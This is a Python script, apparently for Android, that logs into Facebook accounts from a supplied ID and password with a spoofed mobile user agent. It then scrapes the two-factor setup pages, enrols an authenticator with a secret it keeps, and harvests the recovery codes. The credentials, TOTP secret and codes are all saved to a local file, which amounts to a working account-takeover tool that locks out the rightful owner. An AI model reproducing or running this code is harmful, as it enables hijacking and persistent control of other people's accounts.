import pyotp,requests,re,os,sys,random
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as tdp
os.system("clear")
n=0
lim=0
tf=0

def getua():
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    userAgent=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    return userAgent
     
ua=getua()
    
def getCookie(e,p):
    global ua
    session=requests.Session()
    head = {
        'Host': 'm.alpha.facebook.com',
        'viewport-width': '980', 
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?1', 
        'sec-ch-ua-platform': 'Android', 
        'sec-ch-prefers-color-scheme': 'light',
        'dnt': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
        'sec-fetch-site': 'none', 
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9'
            }
    getlog = session.get(f'https://m.alpha.facebook.com/login/device-based/password/?uid={e}&flow=login_no_pin&refsrc=deprecated&_rdr')
    idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":e,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":p}
    complete = session.post('https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head).text
    #print(str(complete))
    dc=dict(session.cookies)
    coki=";".join([k+"="+v for k,v in dc.items()])
    return coki



hd1= {
        'Host': 'mbasic.facebook.com',
        'path':'/security/2fac/setup/intro',
        'method':'GET',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'referer': 'mbasic.facebook.com',
        'sec-ch-ua': '"(Not(A:Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua
                }


def tfa(e,p):
    try:
        global n,lim,tf,ua,hd1
        #print(f"{n}/{lim} [2F-{tf}]",end="\r")
        c=getCookie(e,p)
        print(c)
        #if "checkpoint" in c:
               #print("checkpoint!")
                #pass
        url="https://mbasic.facebook.com/security/2fac/setup/intro"
        s=requests.Session()
        head={
            "User-Agent":ua
        }
        s.headers.update(head)
        s.headers.update(hd1)
        r1=s.get(url,cookies={'cookie':c}).text
        open("/sdcard/k.html","w").write(str(r1))
        #print("Getting Next Page link...")
        #Getting 2nd link . 
        sp=bs(r1,"html.parser")
        a=sp.find_all("a")
        u2=""
        for i in a:
            l=i["href"]
            if "qrcode" in l:
                    u2=l
        #print(u2)
        #print("\u001b[1;32mSTEP 2:\u001b[0m")
        #print(f"Link:{u2}")
        try:
            r2=s.get(u2,cookies={'cookie':c}).text
            open("/sdcard/e2.html","w").write(str(r2))
        except Exception as exp:
            #print(exp)
            pass
            #sys.exit()
        #print("\u001b[1;32mSTEP 3:\u001b[0m")
        sp2=bs(r2,"html.parser")
        a=sp2.find_all("form")[1]
        x=a["action"]
        mode=0
        if "https://mbasic.facebook.com" in x:
            mode =1
        else:
            mode=2
        
        def m1():
            nonlocal e,p,c,s,a,x,r2
            nonlocal mode
            lx=""
            rx=""
            dx={}
            if mode==1:
                #print("\u001b[1;32mReAuth\u001b[0m")
                l2=x
                inps=a.find_all("input")
                d2={"pass":p}
                for i in inps:
                    try:
                        d2[i["name"]]=i["value"]
                    except:
                        pass
                dx=d2
                #print(f"Got Data for auth: {d2}")
                #print(f"Reauth Submission:{l2}")
                l2="https://mbasic.facebook.com"+l2
                hd = {
                    'Host': 'mbasic.facebook.com',
                    'path':'/security/2fac/setup/intro',
                    'method':'GET',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'referer': l2,
                    'sec-ch-ua': '"(Not(A:Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:117.0) Gecko/20010101 Firefox/117.0/6iIUEMpQ05chNQA',
                }
        
                r2=s.post(l2,headers=hd,data=dx,cookies={'cookie':c}).text
                #print("Reauth Done.The key Page")
                sp2=bs(r2,"html.parser")
                a=sp2.find_all("form")[1]
                x=a["action"]
        
            
            lx="https://mbasic.facebook.com"+x
            d2={}
            inps=a.find_all("input")
            for i in inps:
                try:
                    d2[i["name"]]=i["value"]
                except:
                    pass
            dx=d2
            #print(dx,lx)
            rx=s.post(lx,data=dx,cookies={'cookie':c}).text
            #enter key page load
            
            
            
            
            #print(key)
            open("/sdcard/k2.html","w").write(str(rx))#get key
            
            ptrn="secret=\w{32}"
            
            #old
            key=re.search(ptrn,str(r2)).group().replace("secret=","")
                
            #
            print(f"\u001b[1;32mThe Key:{key}")
            
            open("/sdcard/2fk.txt","a").write(e+"  "+p+"\n"+key+"\n")
            
            
            #Step 4 load the enter page
            #print("\u001b[1;32mSTEP 4:\u001b[0m")
            d3={}
            sp4=bs(rx,"html.parser")
            a=sp4.find_all("form")[2]
            inps=a.find_all("input")
            for i in inps:
                try:
                    d3[i["name"]]=i["value"]
                except:
                    pass
            l3="https://mbasic.facebook.com"+a["action"]
            #print(f"Key Submit Page Url:{l3}")
            #print(d3)
            cg=pyotp.TOTP(key)
            d3["code"]=cg.now()
            r4=s.post(l3,data=d3
            ,cookies={'cookie':c}
            ).text
            open("/sdcard/k3.html","w").write(str(r4))
            
            
            #STEP 5 Enter the key
            #print("\u001b[1;32mSTEP 5:\u001b[0m")
            #code sub 2
        
            print("\u001b[1;32mKey Submitted. 2F Done\u001b[0m")
            
            return(r4)
        
        #####Recovery Codes
        #open("/sdcard/k4.html","r").read()
        def getRcodes(cc):
            print("\u001b[1;32mGETTING RECOVERY CODES:\u001b[0m")
            sp2=bs(cc,"html.parser")
            #
            
            a=sp2.find_all("form")[1]
            l5="https://mbasic.facebook.com"+a["action"]
            
            #print(l5)
            
            #2f page
            r5=s.get(l5,cookies={'cookie':c}).text
            
            
            open("/sdcard/k5.html","w").write(str(r5))
            
            sp2=bs(r5,"html.parser")
            a=sp2.find_all("a")
            u2=""
            for i in a:
                l=i["href"]
                if "/security/2fac/factors/recovery-code" in l:
                        u2="https://mbasic.facebook.com"+l
                        
            r6=s.get(u2,cookies={'cookie':c}).text
            open("/sdcard/k6.html","w").write(str(r6))
            
            
            sp2=bs(r6,"html.parser")
            a=sp2.find_all("form")[1]
            inps=a.find_all("input")
            l6="https://mbasic.facebook.com"+a["action"]
            d4={}
            for i in inps:
                    try:
                        d4[i["name"]]=i["value"]
                    except:
                        pass
            #print(l6,d4)
            r7=s.post(l6,data=d4,cookies={'cookie':c}).text
            open("/sdcard/k7.html","w").write(str(r7))
            
            
            rcs=r7
            #open("/sdcard/k5.html","r").read()
            sp2=bs(rcs,"html.parser")
            rc=[]
            frc=sp2.find_all("span",class_="cp")
            return frc
            
        if "checkpoint" not in c:
            try:
                cc=m1()
                frc=getRcodes(cc)
                print(f"\u001b[1;32m{e} {p}")
                tf+=1
                print("\u001b[1;32mRecovery Codes:")
                for i in frc:
                    rcode=i.string
                    print(rcode)
                    open("/sdcard/2fk.txt","a").write("\n"+rcode+"\n")
                print("\u001b[0m")
            except Exception as exp:
                print(exp)
        else:
            print(f"Checkpoint ID {e}")
    except Exception as exp:
        print(exp)
        if "c_user" in c:
            print(f"LOCKED ID {e}")
        elif "checkpoint" in c:
            print(f"Checkpoint ID {e}")
        else:
            print(f"Incorrect pass {e}")
    n+=1

idp=input("UID|PASS:")#open(input("FILE PATH: "),"r").read().splitlines()
e,p=idp.split("|")
try:
    tfa(e,p)
except Exception as exp:
    pass
    #print(exp)